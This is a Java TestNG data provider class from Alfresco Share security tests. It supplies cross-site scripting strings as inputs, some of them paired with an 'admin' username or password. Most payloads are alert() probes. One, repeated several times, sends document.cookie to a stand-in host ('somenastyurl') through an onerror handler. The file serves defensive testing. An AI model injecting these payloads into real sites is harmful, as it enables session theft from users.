package org.alfresco.po.share;

import org.testng.annotations.DataProvider;

public class DataProviderClass
{
    /**
     * Data Provider with 'XSS Strings' used for Security tests
     *
     * @return XSS strings
     */
    @DataProvider (name = "XSSSecurity")
    public static Object[][] XSSSecurity()
    {
        return new Object[][] {
            { "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">" },
            { "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">" },
            { "<img><scrip<script>t>alert('XSS');<</script>/script>" },
            { "<DIV STYLE=\"width: expression(alert('XSS'));\">" },
            { "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">" },
            { "<input onfocus=write(1) autofocus>" },
            { "<input onblur=write(1) autofocus><input autofocus>" },
            { "<body oninput=alert(1)><input autofocus>" },
            { "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>" },
            { "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X" }
        };
    }


    /**
     * Data Provider with invalid credentials (XSS String).
     *
     * @return: 1. XSS username and admin password
     * 2. Admin username and XSS password
     */
    @DataProvider (name = "XSSCredentials")
    public static Object[][] XSSCredentials()
    {
        return new Object[][] {
            { "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">", "admin" },
            { "admin", "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">" },
            { "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">", "admin" },
            { "admin", "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">" },
            { "<DIV STYLE=\"width: expression(alert('XSS'));\">", "admin" },
            { "admin", "<DIV STYLE=\"width: expression(alert('XSS'));\">" },
            { "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "admin" },
            { "admin", "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">" },
            { "<input onfocus=write(1) autofocus>", "admin" },
            { "admin", "<input onfocus=write(1) autofocus>" },
            { "<input onblur=write(1) autofocus><input autofocus>", "admin" },
            { "admin", "<input onblur=write(1) autofocus><input autofocus>" },
            { "<body oninput=alert(1)><input autofocus>", "admin" },
            { "admin", "<body oninput=alert(1)><input autofocus>" },
            { "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>", "admin" },
            { "admin", "<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>" },
            { "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X", "admin" },
            { "admin", "<form id=\"test\" /><button form=\"test\" formaction=\"javascript:alert(1)\">X" }
        };
    }

}
